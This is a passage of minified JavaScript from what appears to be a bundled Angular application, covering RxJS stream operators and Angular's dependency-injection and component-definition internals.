    : ("number" == typeof e && (i = e), R((n, r) => ef(n, r, t, i)));
}
function At(t = 1 / 0) {
  return ie(_e, t);
}
function tf() {
  return At(1);
}
function Rt(...t) {
  return tf()(ee(t, rt(t)));
}
function Nt(t) {
  return new L((e) => {
    J(t()).subscribe(e);
  });
}
var d_ = ["addListener", "removeListener"],
  f_ = ["addEventListener", "removeEventListener"],
  h_ = ["on", "off"];
function Oi(t, e, i, n) {
  if ((E(i) && ((n = i), (i = void 0)), n)) return Oi(t, e, i).pipe(yo(n));
  let [r, o] = m_(t)
    ? f_.map((s) => (a) => t[s](e, a, i))
    : p_(t)
    ? d_.map(nf(t, e))
    : g_(t)
    ? h_.map(nf(t, e))
    : [];
  if (!r && Ln(t)) return ie((s) => Oi(s, e, i))(J(t));
  if (!r) throw new TypeError("Invalid event target");
  return new L((s) => {
    let a = (...c) => s.next(1 < c.length ? c : c[0]);
    return r(a), () => o(a);
  });
}
function nf(t, e) {
  return (i) => (n) => t[i](e, n);
}
function p_(t) {
  return E(t.addListener) && E(t.removeListener);
}
function g_(t) {
  return E(t.on) && E(t.off);
}
function m_(t) {
  return E(t.addEventListener) && E(t.removeEventListener);
}
function rf(t = 0, e, i = Fd) {
  let n = -1;
  return (
    null != e && (oo(e) ? (i = e) : (n = e)),
    new L((r) => {
      let o = Qd(t) ? +t - i.now() : t;
      o < 0 && (o = 0);
      let s = 0;
      return i.schedule(function () {
        r.closed ||
          (r.next(s++), 0 <= n ? this.schedule(void 0, n) : r.complete());
      }, o);
    })
  );
}
function Ii(...t) {
  let e = rt(t),
    i = jd(t, 1 / 0),
    n = t;
  return n.length ? (1 === n.length ? J(n[0]) : At(i)(ee(n, e))) : ye;
}
function Q(t, e) {
  return R((i, n) => {
    let r = 0;
    i.subscribe(S(n, (o) => t.call(e, o, r++) && n.next(o)));
  });
}
function of(t) {
  return R((e, i) => {
    let n = !1,
      r = null,
      o = null,
      s = !1,
      a = () => {
        if ((o?.unsubscribe(), (o = null), n)) {
          n = !1;
          let l = r;
          (r = null), i.next(l);
        }
        s && i.complete();
      },
      c = () => {
        (o = null), s && i.complete();
      };
    e.subscribe(
      S(
        i,
        (l) => {
          (n = !0), (r = l), o || J(t(l)).subscribe((o = S(i, a, c)));
        },
        () => {
          (s = !0), (!n || !o || o.closed) && i.complete();
        }
      )
    );
  });
}
function Co(t, e = Ei) {
  return of(() => rf(t, e));
}
function kt(t) {
  return R((e, i) => {
    let o,
      n = null,
      r = !1;
    (n = e.subscribe(
      S(i, void 0, void 0, (s) => {
        (o = J(t(s, kt(t)(e)))),
          n ? (n.unsubscribe(), (n = null), o.subscribe(i)) : (r = !0);
      })
    )),
      r && (n.unsubscribe(), (n = null), o.subscribe(i));
  });
}
function sf(t, e, i, n, r) {
  return (o, s) => {
    let a = i,
      c = e,
      l = 0;
    o.subscribe(
      S(
        s,
        (u) => {
          let d = l++;
          (c = a ? t(c, u, d) : ((a = !0), u)), n && s.next(c);
        },
        r &&
          (() => {
            a && s.next(c), s.complete();
          })
      )
    );
  };
}
function Ft(t, e) {
  return E(e) ? ie(t, e, 1) : ie(t, 1);
}
function wo(t, e = Ei) {
  return R((i, n) => {
    let r = null,
      o = null,
      s = null,
      a = () => {
        if (r) {
          r.unsubscribe(), (r = null);
          let l = o;
          (o = null), n.next(l);
        }
      };
    function c() {
      let l = s + t,
        u = e.now();
      if (u < l) return (r = this.schedule(void 0, l - u)), void n.add(r);
      a();
    }
    i.subscribe(
      S(
        n,
        (l) => {
          (o = l), (s = e.now()), r || ((r = e.schedule(c, t)), n.add(r));
        },
        () => {
          a(), n.complete();
        },
        void 0,
        () => {
          o = r = null;
        }
      )
    );
  });
}
function Lt(t) {
  return R((e, i) => {
    let n = !1;
    e.subscribe(
      S(
        i,
        (r) => {
          (n = !0), i.next(r);
        },
        () => {
          n || i.next(t), i.complete();
        }
      )
    );
  });
}
function ue(t) {
  return t <= 0
    ? () => ye
    : R((e, i) => {
        let n = 0;
        e.subscribe(
          S(i, (r) => {
            ++n <= t && (i.next(r), t <= n && i.complete());
          })
        );
      });
}
function La(t) {
  return F(() => t);
}
function bo(t, e = _e) {
  return (
    (t = t ?? v_),
    R((i, n) => {
      let r,
        o = !0;
      i.subscribe(
        S(n, (s) => {
          let a = e(s);
          (o || !t(r, a)) && ((o = !1), (r = a), n.next(s));
        })
      );
    })
  );
}
function v_(t, e) {
  return t === e;
}
function Mo(t = __) {
  return R((e, i) => {
    let n = !1;
    e.subscribe(
      S(
        i,
        (r) => {
          (n = !0), i.next(r);
        },
        () => (n ? i.complete() : i.error(t()))
      )
    );
  });
}
function __() {
  return new yt();
}
function Vn(t) {
  return R((e, i) => {
    try {
      e.subscribe(i);
    } finally {
      i.add(t);
    }
  });
}
function Ge(t, e) {
  let i = arguments.length >= 2;
  return (n) =>
    n.pipe(
      t ? Q((r, o) => t(r, o, n)) : _e,
      ue(1),
      i ? Lt(e) : Mo(() => new yt())
    );
}
function Bn(t) {
  return t <= 0
    ? () => ye
    : R((e, i) => {
        let n = [];
        e.subscribe(
          S(
            i,
            (r) => {
              n.push(r), t < n.length && n.shift();
            },
            () => {
              for (let r of n) i.next(r);
              i.complete();
            },
            void 0,
            () => {
              n = null;
            }
          )
        );
      });
}
function ja(t, e) {
  let i = arguments.length >= 2;
  return (n) =>
    n.pipe(
      t ? Q((r, o) => t(r, o, n)) : _e,
      Bn(1),
      i ? Lt(e) : Mo(() => new yt())
    );
}
function Va(t, e) {
  return R(sf(t, e, arguments.length >= 2, !0));
}
function Pi(t) {
  return Q((e, i) => t <= i);
}
function ot(...t) {
  let e = rt(t);
  return R((i, n) => {
    (e ? Rt(t, i, e) : Rt(t, i)).subscribe(n);
  });
}
function xe(t, e) {
  return R((i, n) => {
    let r = null,
      o = 0,
      s = !1,
      a = () => s && !r && n.complete();
    i.subscribe(
      S(
        n,
        (c) => {
          r?.unsubscribe();
          let l = 0,
            u = o++;
          J(t(c, u)).subscribe(
            (r = S(
              n,
              (d) => n.next(e ? e(c, d, u, l++) : d),
              () => {
                (r = null), a();
              }
            ))
          );
        },
        () => {
          (s = !0), a();
        }
      )
    );
  });
}
function st(t) {
  return R((e, i) => {
    J(t).subscribe(S(i, () => i.complete(), Di)), !i.closed && e.subscribe(i);
  });
}
function ce(t, e, i) {
  let n = E(t) || e || i ? { next: t, error: e, complete: i } : t;
  return n
    ? R((r, o) => {
        var s;
        null === (s = n.subscribe) || void 0 === s || s.call(n);
        let a = !0;
        r.subscribe(
          S(
            o,
            (c) => {
              var l;
              null === (l = n.next) || void 0 === l || l.call(n, c), o.next(c);
            },
            () => {
              var c;
              (a = !1),
                null === (c = n.complete) || void 0 === c || c.call(n),
                o.complete();
            },
            (c) => {
              var l;
              (a = !1),
                null === (l = n.error) || void 0 === l || l.call(n, c),
                o.error(c);
            },
            () => {
              var c, l;
              a && (null === (c = n.unsubscribe) || void 0 === c || c.call(n)),
                null === (l = n.finalize) || void 0 === l || l.call(n);
            }
          )
        );
      })
    : _e;
}
var qf = "https://g.co/ng/security#xss",
  D = class extends Error {
    constructor(e, i) {
      super(as(e, i)), (this.code = e);
    }
  };
function as(t, e) {
  return `NG0${Math.abs(t)}${e ? ": " + e : ""}`;
}
function Wi(t) {
  return { toString: t }.toString();
}
var Do = "__parameters__";
function y_(t) {
  return function (...i) {
    if (t) {
      let n = t(...i);
      for (let r in n) this[r] = n[r];
    }
  };
}
function Yf(t, e, i) {
  return Wi(() => {
    let n = y_(e);
    function r(...o) {
      if (this instanceof r) return n.apply(this, o), this;
      let s = new r(...o);
      return (a.annotation = s), a;
      function a(c, l, u) {
        let d = c.hasOwnProperty(Do)
          ? c[Do]
          : Object.defineProperty(c, Do, { value: [] })[Do];
        for (; d.length <= u; ) d.push(null);
        return (d[u] = d[u] || []).push(s), c;
      }
    }
    return (
      i && (r.prototype = Object.create(i.prototype)),
      (r.prototype.ngMetadataName = t),
      (r.annotationCls = r),
      r
    );
  });
}
var Ce = globalThis;
function q(t) {
  for (let e in t) if (t[e] === q) return e;
  throw Error("Could not find renamed property on target object.");
}
function C_(t, e) {
  for (let i in e) e.hasOwnProperty(i) && !t.hasOwnProperty(i) && (t[i] = e[i]);
}
function we(t) {
  if ("string" == typeof t) return t;
  if (Array.isArray(t)) return "[" + t.map(we).join(", ") + "]";
  if (null == t) return "" + t;
  if (t.overriddenName) return `${t.overriddenName}`;
  if (t.name) return `${t.name}`;
  let e = t.toString();
  if (null == e) return "" + e;
  let i = e.indexOf("\n");
  return -1 === i ? e : e.substring(0, i);
}
function af(t, e) {
  return null == t || "" === t
    ? null === e
      ? ""
      : e
    : null == e || "" === e
    ? t
    : t + " " + e;
}
var w_ = q({ __forward_ref__: q });
function Zf(t) {
  return (
    (t.__forward_ref__ = Zf),
    (t.toString = function () {
      return we(this());
    }),
    t
  );
}
function ke(t) {
  return Qf(t) ? t() : t;
}
function Qf(t) {
  return (
    "function" == typeof t && t.hasOwnProperty(w_) && t.__forward_ref__ === Zf
  );
}
function y(t) {
  return {
    token: t.token,
    providedIn: t.providedIn || null,
    factory: t.factory,
    value: void 0,
  };
}
function U(t) {
  return { providers: t.providers || [], imports: t.imports || [] };
}
function cs(t) {
  return cf(t, Xf) || cf(t, Jf);
}
function Kf(t) {
  return null !== cs(t);
}
function cf(t, e) {
  return t.hasOwnProperty(e) ? t[e] : null;
}
function b_(t) {
  return (t && (t[Xf] || t[Jf])) || null;
}
function lf(t) {
  return t && (t.hasOwnProperty(uf) || t.hasOwnProperty(M_)) ? t[uf] : null;
}
var Xf = q({ ɵprov: q }),
  uf = q({ ɵinj: q }),
  Jf = q({ ngInjectableDef: q }),
  M_ = q({ ngInjectorDef: q }),
  b = class {
    constructor(e, i) {
      (this._desc = e),
        (this.ngMetadataName = "InjectionToken"),
        (this.ɵprov = void 0),
        "number" == typeof i
          ? (this.__NG_ELEMENT_ID__ = i)
          : void 0 !== i &&
            (this.ɵprov = y({
              token: this,
              providedIn: i.providedIn || "root",
              factory: i.factory,
            }));
    }
    get multi() {
      return this;
    }
    toString() {
      return `InjectionToken ${this._desc}`;
    }
  };
function eh(t) {
  return t && !!t.ɵproviders;
}
var D_ = q({ ɵcmp: q }),
  x_ = q({ ɵdir: q }),
  E_ = q({ ɵpipe: q }),
  O_ = q({ ɵmod: q }),
  Lo = q({ ɵfac: q }),
  Ti = q({ __NG_ELEMENT_ID__: q }),
  df = q({ __NG_ENV_ID__: q });
function qc(t) {
  return "string" == typeof t ? t : null == t ? "" : String(t);
}
function I_(t) {
  return "function" == typeof t
    ? t.name || t.toString()
    : "object" == typeof t && null != t && "function" == typeof t.type
    ? t.type.name || t.type.toString()
    : qc(t);
}
function P_(t, e) {
  e && e.join(" > ");
  throw new D(-200, t);
}
function Yc(t, e) {
  throw new D(-201, !1);
}
var ec,
  j = (function (t) {
    return (
      (t[(t.Default = 0)] = "Default"),
      (t[(t.Host = 1)] = "Host"),
      (t[(t.Self = 2)] = "Self"),
      (t[(t.SkipSelf = 4)] = "SkipSelf"),
      (t[(t.Optional = 8)] = "Optional"),
      t
    );
  })(j || {});
function th() {
  return ec;
}
function Ne(t) {
  let e = ec;
  return (ec = t), e;
}
function nh(t, e, i) {
  let n = cs(t);
  return n && "root" == n.providedIn
    ? void 0 === n.value
      ? (n.value = n.factory())
      : n.value
    : i & j.Optional
    ? null
    : void 0 !== e
    ? e
    : void Yc(t, "Injector");
}
var Wn,
  S_ = {},
  Ri = S_,
  tc = "__NG_DI_FLAG__",
  jo = "ngTempTokenPath",
  T_ = "ngTokenPath",
  A_ = /\n/gm,
  R_ = "ɵ",
  ff = "__source";
function N_() {
  return Wn;
}
function jt(t) {
  let e = Wn;
  return (Wn = t), e;
}
function k_(t, e = j.Default) {
  if (void 0 === Wn) throw new D(-203, !1);
  return null === Wn
    ? nh(t, void 0, e)
    : Wn.get(t, e & j.Optional ? null : void 0, e);
}
function h(t, e = j.Default) {
  return (th() || k_)(ke(t), e);
}
function v(t, e = j.Default) {
  return h(t, ls(e));
}
function ls(t) {
  return typeof t > "u" || "number" == typeof t
    ? t
    : (t.optional && 8) | (t.host && 1) | (t.self && 2) | (t.skipSelf && 4);
}
function nc(t) {
  let e = [];
  for (let i = 0; i < t.length; i++) {
    let n = ke(t[i]);
    if (Array.isArray(n)) {
      if (0 === n.length) throw new D(900, !1);
      let r,
        o = j.Default;
      for (let s = 0; s < n.length; s++) {
        let a = n[s],
          c = F_(a);
        "number" == typeof c ? (-1 === c ? (r = a.token) : (o |= c)) : (r = a);
      }
      e.push(h(r, o));
    } else e.push(h(n));
  }
  return e;
}
function ih(t, e) {
  return (t[tc] = e), (t.prototype[tc] = e), t;
}
function F_(t) {
  return t[tc];
}
function L_(t, e, i, n) {
  let r = t[jo];
  throw (
    (e[ff] && r.unshift(e[ff]),
    (t.message = j_("\n" + t.message, r, i, n)),
    (t[T_] = r),
    (t[jo] = null),
    t)
  );
}
function j_(t, e, i, n = null) {
  t = t && "\n" === t.charAt(0) && t.charAt(1) == R_ ? t.slice(2) : t;
  let r = we(e);
  if (Array.isArray(e)) r = e.map(we).join(" -> ");
  else if ("object" == typeof e) {
    let o = [];
    for (let s in e)
      if (e.hasOwnProperty(s)) {
        let a = e[s];
        o.push(s + ":" + ("string" == typeof a ? JSON.stringify(a) : we(a)));
      }
    r = `{${o.join(", ")}}`;
  }
  return `${i}${n ? "(" + n + ")" : ""}[${r}]: ${t.replace(A_, "\n  ")}`;
}
var us = ih(Yf("Optional"), 8),
  Zc = ih(Yf("SkipSelf"), 4);
function qn(t, e) {
  return t.hasOwnProperty(Lo) ? t[Lo] : null;
}
function V_(t, e, i) {
  if (t.length !== e.length) return !1;
  for (let n = 0; n < t.length; n++) {
    let r = t[n],
      o = e[n];
    if ((i && ((r = i(r)), (o = i(o))), o !== r)) return !1;
  }
  return !0;
}
function B_(t) {
  return t.flat(Number.POSITIVE_INFINITY);
}
function Qc(t, e) {
  t.forEach((i) => (Array.isArray(i) ? Qc(i, e) : e(i)));
}
function rh(t, e, i) {
  e >= t.length ? t.push(i) : t.splice(e, 0, i);
}
function Vo(t, e) {
  return e >= t.length - 1 ? t.pop() : t.splice(e, 1)[0];
}
function U_(t, e, i, n) {
  let r = t.length;
  if (r == e) t.push(i, n);
  else if (1 === r) t.push(n, t[0]), (t[0] = i);
  else {
    for (r--, t.push(t[r - 1], t[r]); r > e; ) {
      let o = r - 2;
      (t[r] = t[o]), r--;
    }
    (t[e] = i), (t[e + 1] = n);
  }
}
function $_(t, e, i) {
  let n = Gi(t, e);
  return n >= 0 ? (t[1 | n] = i) : ((n = ~n), U_(t, n, e, i)), n;
}
function Ba(t, e) {
  let i = Gi(t, e);
  if (i >= 0) return t[1 | i];
}
function Gi(t, e) {
  return H_(t, e, 1);
}
function H_(t, e, i) {
  let n = 0,
    r = t.length >> i;
  for (; r !== n; ) {
    let o = n + ((r - n) >> 1),
      s = t[o << i];
    if (e === s) return o << i;
    s > e ? (r = o) : (n = o + 1);
  }
  return ~(r << i);
}
var Yn = {},
  Ie = [],
  cn = new b(""),
  oh = new b("", -1),
  sh = new b(""),
  Bo = class {
    get(e, i = Ri) {
      if (i === Ri) {
        let n = new Error(`NullInjectorError: No provider for ${we(e)}!`);
        throw ((n.name = "NullInjectorError"), n);
      }
      return i;
    }
  },
  ah = (function (t) {
    return (t[(t.OnPush = 0)] = "OnPush"), (t[(t.Default = 1)] = "Default"), t;
  })(ah || {}),
  lt = (function (t) {
    return (
      (t[(t.Emulated = 0)] = "Emulated"),
      (t[(t.None = 2)] = "None"),
      (t[(t.ShadowDom = 3)] = "ShadowDom"),
      t
    );
  })(lt || {}),
  de = (function (t) {
    return (
      (t[(t.None = 0)] = "None"),
      (t[(t.SignalBased = 1)] = "SignalBased"),
      (t[(t.HasDecoratorInputTransform = 2)] = "HasDecoratorInputTransform"),
      t
    );
  })(de || {});
function z_(t, e, i) {
  let n = t.length;
  for (;;) {
    let r = t.indexOf(e, i);
    if (-1 === r) return r;
    if (0 === r || t.charCodeAt(r - 1) <= 32) {
      let o = e.length;
      if (r + o === n || t.charCodeAt(r + o) <= 32) return r;
    }
    i = r + 1;
  }
}
function ic(t, e, i) {
  let n = 0;
  for (; n < i.length; ) {
    let r = i[n];
    if ("number" == typeof r) {
      if (0 !== r) break;
      n++;
      let o = i[n++],
        s = i[n++],
        a = i[n++];
      t.setAttribute(e, s, a, o);
    } else {
      let o = r,
        s = i[++n];
      W_(o) ? t.setProperty(e, o, s) : t.setAttribute(e, o, s), n++;
    }
  }
  return n;
}
function ch(t) {
  return 3 === t || 4 === t || 6 === t;
}
function W_(t) {
  return 64 === t.charCodeAt(0);
}
function Ni(t, e) {
  if (null !== e && 0 !== e.length)
    if (null === t || 0 === t.length) t = e.slice();
    else {
      let i = -1;
      for (let n = 0; n < e.length; n++) {
        let r = e[n];
        "number" == typeof r
          ? (i = r)
          : 0 === i || hf(t, i, r, null, -1 === i || 2 === i ? e[++n] : null);
      }
    }
  return t;
}
function hf(t, e, i, n, r) {
  let o = 0,
    s = t.length;
  if (-1 === e) s = -1;
  else
    for (; o < t.length; ) {
      let a = t[o++];
      if ("number" == typeof a) {
        if (a === e) {
          s = -1;
          break;
        }
        if (a > e) {
          s = o - 1;
          break;
        }
      }
    }
  for (; o < t.length; ) {
    let a = t[o];
    if ("number" == typeof a) break;
    if (a === i) {
      if (null === n) return void (null !== r && (t[o + 1] = r));
      if (n === t[o + 1]) return void (t[o + 2] = r);
    }
    o++, null !== n && o++, null !== r && o++;
  }
  -1 !== s && (t.splice(s, 0, e), (o = s + 1)),
    t.splice(o++, 0, i),
    null !== n && t.splice(o++, 0, n),
    null !== r && t.splice(o++, 0, r);
}
var lh = "ng-template";
function G_(t, e, i, n) {
  let r = 0;
  if (n) {
    for (; r < e.length && "string" == typeof e[r]; r += 2)
      if ("class" === e[r] && -1 !== z_(e[r + 1].toLowerCase(), i, 0))
        return !0;
  } else if (Kc(t)) return !1;
  if (((r = e.indexOf(1, r)), r > -1)) {
    let o;
    for (; ++r < e.length && "string" == typeof (o = e[r]); )
      if (o.toLowerCase() === i) return !0;
  }
  return !1;
}
function Kc(t) {
  return 4 === t.type && t.value !== lh;
}
function q_(t, e, i) {
  return e === (4 !== t.type || i ? t.value : lh);
}
function Y_(t, e, i) {
  let n = 4,
    r = t.attrs,
    o = null !== r ? K_(r) : 0,
    s = !1;
  for (let a = 0; a < e.length; a++) {
    let c = e[a];
    if ("number" != typeof c) {
      if (!s)
        if (4 & n) {
          if (
            ((n = 2 | (1 & n)),
            ("" !== c && !q_(t, c, i)) || ("" === c && 1 === e.length))
          ) {
            if (qe(n)) return !1;
            s = !0;
          }
        } else if (8 & n) {
          if (null === r || !G_(t, r, c, i)) {
            if (qe(n)) return !1;
            s = !0;
          }
        } else {
          let l = e[++a],
            u = Z_(c, r, Kc(t), i);
          if (-1 === u) {
            if (qe(n)) return !1;
            s = !0;
            continue;
          }
          if ("" !== l) {
            let d;
            if (((d = u > o ? "" : r[u + 1].toLowerCase()), 2 & n && l !== d)) {
              if (qe(n)) return !1;
              s = !0;
            }
          }
        }
    } else {
      if (!s && !qe(n) && !qe(c)) return !1;
      if (s && qe(c)) continue;
      (s = !1), (n = c | (1 & n));
    }
  }
  return qe(n) || s;
}
function qe(t) {
  return !(1 & t);
}
function Z_(t, e, i, n) {
  if (null === e) return -1;
  let r = 0;
  if (n || !i) {
    let o = !1;
    for (; r < e.length; ) {
      let s = e[r];
      if (s === t) return r;
      if (3 === s || 6 === s) o = !0;
      else {
        if (1 === s || 2 === s) {
          let a = e[++r];
          for (; "string" == typeof a; ) a = e[++r];
          continue;
        }
        if (4 === s) break;
        if (0 === s) {
          r += 4;
          continue;
        }
      }
      r += o ? 1 : 2;
    }
    return -1;
  }
  return X_(e, t);
}
function Q_(t, e, i = !1) {
  for (let n = 0; n < e.length; n++) if (Y_(t, e[n], i)) return !0;
  return !1;
}
function K_(t) {
  for (let e = 0; e < t.length; e++) {
    if (ch(t[e])) return e;
  }
  return t.length;
}
function X_(t, e) {
  let i = t.indexOf(4);
  if (i > -1)
    for (i++; i < t.length; ) {
      let n = t[i];
      if ("number" == typeof n) return -1;
      if (n === e) return i;
      i++;
    }
  return -1;
}
function pf(t, e) {
  return t ? ":not(" + e.trim() + ")" : e;
}
function J_(t) {
  let e = t[0],
    i = 1,
    n = 2,
    r = "",
    o = !1;
  for (; i < t.length; ) {
    let s = t[i];
    if ("string" == typeof s)
      if (2 & n) {
        let a = t[++i];
        r += "[" + s + (a.length > 0 ? '="' + a + '"' : "") + "]";
      } else 8 & n ? (r += "." + s) : 4 & n && (r += " " + s);
    else
      "" !== r && !qe(s) && ((e += pf(o, r)), (r = "")),
        (n = s),
        (o = o || !qe(n));
    i++;
  }
  return "" !== r && (e += pf(o, r)), e;
}
function ey(t) {
  return t.map(J_).join(",");
}
function ty(t) {
  let e = [],
    i = [],
    n = 1,
    r = 2;
  for (; n < t.length; ) {
    let o = t[n];
    if ("string" == typeof o)
      2 === r ? "" !== o && e.push(o, t[++n]) : 8 === r && i.push(o);
    else {
      if (!qe(r)) break;
      r = o;
    }
    n++;
  }
  return { attrs: e, classes: i };
}
function he(t) {
  return Wi(() => {
    let e = ph(t),
      i = Z(C({}, e), {
        decls: t.decls,
        vars: t.vars,
        template: t.template,
        consts: t.consts || null,
        ngContentSelectors: t.ngContentSelectors,
        onPush: t.changeDetection === ah.OnPush,
        directiveDefs: null,
        pipeDefs: null,
        dependencies: (e.standalone && t.dependencies) || null,
        getStandaloneInjector: null,
        signals: t.signals ?? !1,
        data: t.data || {},
        encapsulation: t.encapsulation || lt.Emulated,
        styles: t.styles || Ie,
        _: null,
        schemas: t.schemas || null,
        tView: null,
        id: "",
      });
    gh(i);
    let n = t.dependencies;
    return (
      (i.directiveDefs = mf(n, !1)), (i.pipeDefs = mf(n, !0)), (i.id = ry(i)), i
    );
  });
}
function ny(t) {
  return Bt(t) || uh(t);
}
function iy(t) {
  return null !== t;
}
function $(t) {
  return Wi(() => ({
    type: t.type,
    bootstrap: t.bootstrap || Ie,
    declarations: t.declarations || Ie,
    imports: t.imports || Ie,
    exports: t.exports || Ie,
    transitiveCompileScopes: null,
    schemas: t.schemas || null,
    id: t.id || null,
  }));
}
function gf(t, e) {
  if (null == t) return Yn;
  let i = {};
  for (let n in t)
    if (t.hasOwnProperty(n)) {
      let o,
        s,
        r = t[n],
        a = de.None;
      Array.isArray(r)
        ? ((a = r[0]), (o = r[1]), (s = r[2] ?? o))
        : ((o = r), (s = r)),
        e ? ((i[o] = a !== de.None ? [n, a] : n), (e[o] = s)) : (i[o] = n);
    }
  return i;
}
function be(t) {
  return Wi(() => {
    let e = ph(t);
    return gh(e), e;
  });
}
function Bt(t) {
  return t[D_] || null;
}
function uh(t) {
  return t[x_] || null;
}
function dh(t) {
  return t[E_] || null;
}
function fh(t) {
  let e = Bt(t) || uh(t) || dh(t);
  return null !== e && e.standalone;
}
function hh(t, e) {
  let i = t[O_] || null;
  if (!i && !0 === e)
    throw new Error(`Type ${we(t)} does not have 'ɵmod' property.`);
  return i;
}
function ph(t) {
  let e = {};
  return {
    type: t.type,
    providersResolver: null,
    factory: null,
    hostBindings: t.hostBindings || null,
    hostVars: t.hostVars || 0,
    hostAttrs: t.hostAttrs || null,
    contentQueries: t.contentQueries || null,
    declaredInputs: e,
    inputTransforms: null,
    inputConfig: t.inputs || Yn,
    exportAs: t.exportAs || null,
    standalone: !0 === t.standalone,
    signals: !0 === t.signals,
    selectors: t.selectors || Ie,
    viewQuery: t.viewQuery || null,
    features: t.features || null,
    setInput: null,
    findHostDirectiveDefs: null,
    hostDirectives: null,
    inputs: gf(t.inputs, e),
    outputs: gf(t.outputs),
    debugInfo: null,
  };
}
function gh(t) {
  t.features?.forEach((e) => e(t));
}
function mf(t, e) {
  if (!t) return null;
  let i = e ? dh : ny;
  return () => ("function" == typeof t ? t() : t).map((n) => i(n)).filter(iy);
}
function ry(t) {
  let e = 0,
    i = [
      t.selectors,
      t.ngContentSelectors,
      t.hostVars,
      t.hostAttrs,
      t.consts,
      t.vars,
      t.decls,
      t.encapsulation,
      t.standalone,
      t.signals,
      t.exportAs,
      JSON.stringify(t.inputs),
      JSON.stringify(t.outputs),
      Object.getOwnPropertyNames(t.type.prototype),
      !!t.contentQueries,
      !!t.viewQuery,
    ].join("|");
  for (let r of i) e = (Math.imul(31, e) + r.charCodeAt(0)) | 0;
  return (e += 2147483648), "c" + e;
}
function qi(t) {
  return { ɵproviders: t };
}
function oy(...t) {
  return { ɵproviders: mh(!0, t), ɵfromNgModule: !0 };
}
function mh(t, ...e) {
  let r,
    i = [],
    n = new Set(),
    o = (s) => {
      i.push(s);
    };
  return (
    Qc(e, (s) => {
      let a = s;
      rc(a, o, [], n) && ((r ||= []), r.push(a));
    }),
    void 0 !== r && vh(r, o),
    i
  );
}
function vh(t, e) {
  for (let i = 0; i < t.length; i++) {
    let { ngModule: n, providers: r } = t[i];
    Xc(r, (o) => {
      e(o, n);
    });
  }
}
function rc(t, e, i, n) {
  if (!(t = ke(t))) return !1;
  let r = null,
    o = lf(t),
    s = !o && Bt(t);
  if (o || s) {
    if (s && !s.standalone) return !1;
    r = t;
  } else {
    let c = t.ngModule;
    if (((o = lf(c)), !o)) return !1;
    r = c;
  }
  let a = n.has(r);
  if (s) {
    if (a) return !1;
    if ((n.add(r), s.dependencies)) {
      let c =
        "function" == typeof s.dependencies ? s.dependencies() : s.dependencies;
      for (let l of c) rc(l, e, i, n);
    }
  } else {
    if (!o) return !1;
    {
      if (null != o.imports && !a) {
        let l;
        n.add(r);
        try {
          Qc(o.imports, (u) => {
            rc(u, e, i, n) && ((l ||= []), l.push(u));
          });
        } finally {
        }
        void 0 !== l && vh(l, e);
      }
      if (!a) {
        let l = qn(r) || (() => new r());
        e({ provide: r, useFactory: l, deps: Ie }, r),
          e({ provide: sh, useValue: r, multi: !0 }, r),
          e({ provide: cn, useValue: () => h(r), multi: !0 }, r);
      }
      let c = o.providers;
      if (null != c && !a) {
        let l = t;
        Xc(c, (u) => {
          e(u, l);
        });
      }
    }
  }
  return r !== t && void 0 !== t.providers;
}
function Xc(t, e) {
  for (let i of t)
    eh(i) && (i = i.ɵproviders), Array.isArray(i) ? Xc(i, e) : e(i);
}
var sy = q({ provide: String, useValue: q });
function _h(t) {
  return null !== t && "object" == typeof t && sy in t;
}
function ay(t) {
  return !(!t || !t.useExisting);
}
function cy(t) {
  return !(!t || !t.useFactory);
}
function oc(t) {
  return "function" == typeof t;
}
var Ua,
  ds = new b(""),
  To = {},
  ly = {};
function Jc() {
  return void 0 === Ua && (Ua = new Bo()), Ua;
}
var Oe = class {},
  ki = class extends Oe {
    get destroyed() {
      return this._destroyed;
    }
    constructor(e, i, n, r) {
      super(),
        (this.parent = i),
        (this.source = n),
        (this.scopes = r),
        (this.records = new Map()),
        (this._ngOnDestroyHooks = new Set()),
        (this._onDestroyHooks = []),
        (this._destroyed = !1),
        ac(e, (s) => this.processProvider(s)),
        this.records.set(oh, Un(void 0, this)),
        r.has("environment") && this.records.set(Oe, Un(void 0, this));
      let o = this.records.get(ds);
      null != o && "string" == typeof o.value && this.scopes.add(o.value),
        (this.injectorDefTypes = new Set(this.get(sh, Ie, j.Self)));
    }
    destroy() {
      this.assertNotDestroyed(), (this._destroyed = !0);
      let e = z(null);
      try {
        for (let n of this._ngOnDestroyHooks) n.ngOnDestroy();
        let i = this._onDestroyHooks;
        this._onDestroyHooks = [];
        for (let n of i) n();
      } finally {
        this.records.clear(),
          this._ngOnDestroyHooks.clear(),
          this.injectorDefTypes.clear(),
          z(e);
      }
    }
    onDestroy(e) {
      return (
        this.assertNotDestroyed(),
        this._onDestroyHooks.push(e),
        () => this.removeOnDestroy(e)
      );
    }
    runInContext(e) {
      this.assertNotDestroyed();
      let i = jt(this),
        n = Ne(void 0);
      try {
        return e();
      } finally {
        jt(i), Ne(n);
      }
    }
    get(e, i = Ri, n = j.Default) {
      if ((this.assertNotDestroyed(), e.hasOwnProperty(df))) return e[df](this);
      n = ls(n);
      let o = jt(this),
        s = Ne(void 0);
      try {
        if (!(n & j.SkipSelf)) {
          let c = this.records.get(e);
          if (void 0 === c) {
            let l = gy(e) && cs(e);
            (c = l && this.injectableDefInScope(l) ? Un(sc(e), To) : null),
              this.records.set(e, c);
          }
          if (null != c) return this.hydrate(e, c);
        }
        let a = n & j.Self ? Jc() : this.parent;
        return (i = n & j.Optional && i === Ri ? null : i), a.get(e, i);
      } catch (a) {
        if ("NullInjectorError" === a.name) {
          if (((a[jo] = a[jo] || []).unshift(we(e)), o)) throw a;
          return L_(a, e, "R3InjectorError", this.source);
        }
        throw a;
      } finally {
        Ne(s), jt(o);
      }
    }
    resolveInjectorInitializers() {
      let e = z(null),
        i = jt(this),
        n = Ne(void 0);
      try {
        let o = this.get(cn, Ie, j.Self);
        for (let s of o) s();
      } finally {
        jt(i), Ne(n), z(e);
      }
    }
    toString() {
      let e = [],
        i = this.records;
      for (let n of i.keys()) e.push(we(n));
      return `R3Injector[${e.join(", ")}]`;
    }
    assertNotDestroyed() {
      if (this._destroyed) throw new D(205, !1);
    }
    processProvider(e) {
      let i = oc((e = ke(e))) ? e : ke(e && e.provide),
        n = dy(e);
      if (!oc(e) && !0 === e.multi) {
        let r = this.records.get(i);
        r ||
          ((r = Un(void 0, To, !0)),
          (r.factory = () => nc(r.multi)),
          this.records.set(i, r)),
          (i = e),
          r.multi.push(e);
      }
      this.records.set(i, n);
    }
    hydrate(e, i) {
      let n = z(null);
      try {
        return (
          i.value === To && ((i.value = ly), (i.value = i.factory())),
          "object" == typeof i.value &&
            i.value &&
